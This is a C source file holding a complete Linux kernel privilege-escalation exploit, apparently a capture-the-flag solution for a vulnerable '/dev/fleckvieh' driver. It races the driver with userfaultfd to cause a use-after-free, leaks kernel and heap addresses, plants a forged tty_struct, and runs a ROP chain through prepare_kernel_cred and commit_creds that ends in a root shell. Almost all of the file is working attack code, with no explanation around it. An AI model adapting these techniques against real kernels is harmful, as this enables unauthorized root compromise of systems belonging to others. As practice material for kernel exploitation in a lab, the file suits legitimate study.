#define _GNU_SOURCE
#include <fcntl.h>              // for open, O_RDWR, O_CLOEXEC, O_NOCTTY
#include <sys/types.h>          // for ssize_t
#include <linux/userfaultfd.h>  // for uffdio_copy, uffd_msg, uffdio_register
#include <inttypes.h>           // for uintptr_t, uint64_t, PRIx64, uint32_t
#include <pthread.h>            // for pthread_create, pthread_detach, pthre...
#include <sched.h>              // for sched_setaffinity, sched_yield, CPU_SET
#include <stdbool.h>            // for true
#include <stdio.h>              // for NULL, perror, printf, size_t, puts
#include <stdlib.h>             // for calloc, free, EXIT_FAILURE, EXIT_SUCCESS
#include <string.h>             // for memcpy
#include <sys/ioctl.h>          // for ioctl
#include <sys/mman.h>           // for mmap, MAP_ANONYMOUS, MAP_PRIVATE, PRO...
#include <sys/syscall.h>        // for SYS_userfaultfd
#include <unistd.h>             // for close, execve, read, syscall, sysconf

/* Return frame for iretq */
uintptr_t cs;
uintptr_t rflags;
uintptr_t rsp;
uintptr_t ss;

#define CMD_ADD 0xf1ec0001
#define CMD_DEL 0xf1ec0002
#define CMD_GET 0xf1ec0003
#define CMD_SET 0xf1ec0004

typedef struct {
	int id;
	size_t size;
	char *data;
} request_t;

#define tty_struct_len 0x400
#define ROP_OFFSET 0x300
#define PTMX_COUNT 0x10

#define push_rdx_pop_rsp_pop_rbp_ret	0xffffffff8109b13a
#define pop_rdi_ret			0xffffffff811104a2
#define prepare_kernel_cred		0xffffffff810729d0
#define pop_rcx_pop_rbp_ret		0xffffffff810f5f83
#define mov_rdi_rax_rep_ret		0xffffffff81654bdb
#define commit_creds			0xffffffff81072830
#define kpti				0xffffffff81800e26

uintptr_t kheap;
uintptr_t offset;
#define OFFSET(addr) (addr + offset)

static volatile int victim = -1;
static volatile int ptmx[PTMX_COUNT] = { 0 };
static long page_size;
static uintptr_t mm;
static int uffd = -1;
static int dev = -1;

static void shell(void)
{
	puts("[+] get r00t!");
	execve("/bin/sh", (char *[]){ "/bin/sh", NULL }, NULL);
}

static void save_state(void)
{
	asm volatile("movq %%cs, %[cs]\n\t"
		     "pushfq\n\t"
		     "popq %[rflags]\n\t"
		     "movq %%rsp, %[rsp]\n\t"
		     "movq %%ss, %[ss]"
		     : [cs] "=r"(cs), [rflags] "=r"(rflags), [rsp] "=r"(rsp),
		       [ss] "=r"(ss));
}

static void cpu_pin(int cpu)
{
	cpu_set_t set;

	CPU_ZERO(&set);
	CPU_SET(cpu, &set);
	sched_setaffinity(0, sizeof(set), &set);
}

static int dev_add(char *data, size_t len)
{
	request_t req = {
		.id = 0,
		.size = len,
		.data = data,
	};

	return ioctl(dev, CMD_ADD, &req);
}

static int dev_del(int id)
{
	request_t req = {
		.id = id,
		.size = 0,
		.data = NULL,
	};

	return ioctl(dev, CMD_DEL, &req);
}

static int dev_get(int id, char *data, size_t len)
{
	request_t req = {
		.id = id,
		.size = len,
		.data = data,
	};

	return ioctl(dev, CMD_GET, &req);
}

static int dev_set(int id, char *data, size_t len)
{
	request_t req = {
		.id = id,
		.size = len,
		.data = data,
	};

	return ioctl(dev, CMD_SET, &req);
}

static void fake_tty_struct(uintptr_t buf)
{
	uint32_t ops_offset = 0x100;

	memcpy((void *)buf, (void *)(mm + page_size), tty_struct_len);
	uintptr_t *rop = (uintptr_t *)(buf + ROP_OFFSET);
	uintptr_t *tty = (uintptr_t *)buf;
	uintptr_t ops = buf + ops_offset;

	*tty++ = 0x0000000100005401;		/* magic */
	*tty++ = 0;
	*tty++ = *(uintptr_t *)(mm + 0x10);	/* dev */
	*tty++ = kheap + ops_offset;		/* ops */

	*(uintptr_t *)(ops + 0x00) = OFFSET(0xffffffff8133fe90);		/* ops->lookup */
	*(uintptr_t *)(ops + 0x08) = OFFSET(0xffffffff81340840);		/* ops->install */
	*(uintptr_t *)(ops + 0x10) = OFFSET(0xffffffff813402b0);		/* ops->remove */
	*(uintptr_t *)(ops + 0x18) = OFFSET(0xffffffff813404d0);		/* ops->open */
	*(uintptr_t *)(ops + 0x20) = OFFSET(0xffffffff813409e0);		/* ops->close */
	*(uintptr_t *)(ops + 0x30) = OFFSET(0xffffffff81340290);		/* ops->cleanup */
	*(uintptr_t *)(ops + 0x38) = OFFSET(0xffffffff81340200);		/* ops->write */
	*(uintptr_t *)(ops + 0x50) = OFFSET(0xffffffff81340470);		/* ops->write_room */
	*(uintptr_t *)(ops + 0x60) = OFFSET(push_rdx_pop_rsp_pop_rbp_ret);	/* ops->write_room */
	*(uintptr_t *)(ops + 0x80) = OFFSET(0xffffffff813404a0);		/* ops->unthrottle */
	*(uintptr_t *)(ops + 0x108) = OFFSET(0xffffffff8133fff0);		/* ops->flush_buffer */
	*(uintptr_t *)(ops + 0x138) = OFFSET(0xffffffff8133ff00);		/* ops->resize */
	*(uintptr_t *)(ops + 0x158) = OFFSET(0xffffffff81340350);		/* ops->show_fdinfo */
	
	*rop++ = 0;				/* pop rbp */
	*rop++ = OFFSET(pop_rdi_ret);
	*rop++ = (uintptr_t)NULL;
	*rop++ = OFFSET(prepare_kernel_cred);
	*rop++ = OFFSET(pop_rcx_pop_rbp_ret);
	*rop++ = 0;
	*rop++ = 0;
	*rop++ = OFFSET(mov_rdi_rax_rep_ret);
	*rop++ = OFFSET(commit_creds);
	*rop++ = OFFSET(kpti);
	*rop++ = 0;
	*rop++ = 0;
	*rop++ = (uintptr_t)shell;
	*rop++ = cs;
	*rop++ = rflags;
	*rop++ = rsp;
	*rop++ = ss;
}

static void *fault_handler_thread(void *arg)
{
	(void)arg;
	struct uffdio_copy copy;
	char *buf = NULL;
	static int count = 0;
	struct uffd_msg msg;

	cpu_pin(0);
	buf = calloc(page_size, 1);
	if (!buf)
		goto out;

	while (true) {
		if (count > 2)
			goto out;

		ssize_t nr = read(uffd, &msg, sizeof(msg));
		if (nr == 0)
			goto out;

		if (nr < 0)
			continue;

		if (msg.event != UFFD_EVENT_PAGEFAULT)
			continue;

		if (count == 2) {
			fake_tty_struct((uintptr_t)buf);
			for (int i = 0; i < 0x100; i++)
				dev_add(buf, tty_struct_len);
		}

		sched_yield();
		if (dev_del(victim)) {
			for (int i = 0; i < PTMX_COUNT; ++i)
				ptmx[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);
			victim = -1;
		}

		/* copy memory */
		copy.dst = msg.arg.pagefault.address;
		copy.src = (uintptr_t)buf;
		copy.len = page_size;
		copy.mode = 0;
		ioctl(uffd, UFFDIO_COPY, &copy);

		count++;
	}

out:
	if (buf)
		free(buf);
	return NULL;
}

static int register_uffd(uintptr_t start, uint64_t len)
{
	struct uffdio_register reg;
	struct uffdio_api api;
	pthread_t tid;
	int ret;

	/* open uffd */
	uffd = syscall(SYS_userfaultfd, O_CLOEXEC);
	if (uffd == -1)
		goto err;

	/* enable uffd */
	api.api = UFFD_API;
	api.features = 0;
	if (ioctl(uffd, UFFDIO_API, &api) == -1)
		goto err;

	/* register */
	reg.range.start = start;
	reg.range.len = len;
	reg.mode = UFFDIO_REGISTER_MODE_MISSING;
	if (ioctl(uffd, UFFDIO_REGISTER, &reg) == -1)
		goto err;

	ret = pthread_create(&tid, NULL, fault_handler_thread, NULL);
	if (ret != 0)
		goto err;

	pthread_detach(tid);
	return 0;

err:
	if (uffd > 0) {
		close(uffd);
		uffd = -1;
	}
	return -1;
}

static int uaf_ioctl(uint32_t cmd, char *data, uint64_t len)
{
	int ret = 0;
	char *zero = NULL;

	zero = calloc(tty_struct_len, 1);
	victim = dev_add(zero, tty_struct_len);
	if (victim < 0) {
		ret = -1;
		goto out;
	}

	switch (cmd) {
	case CMD_GET:
		ret = dev_get(victim, data, len);
		break;
	case CMD_SET:
		ret = dev_set(victim, data, len);
		break;
	default:
		ret = -1;
		goto out;
	}

	if (ret < 0) {
		ret = -1;
		goto out;
	}

	if (cmd == CMD_SET)
		return 0;

out:
	if (zero)
		free(zero);

	if (victim > 0) {
		dev_del(victim);
		victim = -1;
	}

	for (int i = 0; i < PTMX_COUNT; ++i) {
		if (ptmx[i] > 0) {
			close(ptmx[i]);
			ptmx[i] = 0;
		}
	}
	return ret;
}

static int leak_offset(char *data)
{
	if (uaf_ioctl(CMD_GET, data, 0x20) == -1)
		return -1;

	offset = *(uintptr_t *)&data[0x18] - 0xffffffff81c3c3c0;
	printf("[+]offset: %#" PRIx64 "\n", offset);
	return 0;
}

static int leak_kheap(char *data)
{
	if (uaf_ioctl(CMD_GET, data, tty_struct_len) == -1)
		return -1;

	kheap = *(uintptr_t *)&data[0x38] - 0x38;
	printf("[+]kheap: %#" PRIx64 "\n", kheap);
	return 0;
}

static int hijack_ops(char *data)
{
	if (uaf_ioctl(CMD_SET, data, tty_struct_len) == -1)
		return -1;

	return 0;
}

int main(void)
{
	uint64_t mm_len;

	cpu_pin(0);
	save_state();
	page_size = sysconf(_SC_PAGESIZE);
	mm_len = 4 * page_size;

	dev = open("/dev/fleckvieh", O_RDWR);
	if (dev < 0) {
		perror("[-] open");
		return EXIT_FAILURE;
	}

	mm = (uintptr_t)mmap(NULL, mm_len, PROT_READ | PROT_WRITE,
			     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (!mm) {
		perror("[-] mmap");
		return EXIT_FAILURE;
	}

	if (register_uffd(mm, mm_len) == -1) {
		perror("[-] register_uffd");
		return EXIT_FAILURE;
	}

	leak_offset((char *)mm);
	leak_kheap((char *)(mm + page_size));

	hijack_ops((char *)(mm + page_size + page_size));
	for (int i = 0; i < PTMX_COUNT; ++i)
		ioctl(ptmx[i], 0, kheap + ROP_OFFSET);

	return EXIT_SUCCESS;
}
